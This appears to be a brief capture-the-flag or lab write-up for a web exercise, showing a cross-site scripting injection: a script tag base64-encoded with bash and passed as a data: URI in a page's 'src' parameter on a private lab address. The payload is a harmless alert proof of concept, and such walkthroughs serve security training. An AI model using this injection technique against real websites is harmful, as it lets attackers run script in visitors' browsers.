## 1

Check the NSA link (the bird with headphones). The address will be something like:
http://10.39.42.166/?page=media&src=nsa

## 2

use bash to convert the script to base64

echo -n "<script>alert('toto')</script>" | base64
# Output: PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ+

Then create the address:
http://{ip_address}/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgndG90bycpPC9zY3JpcHQ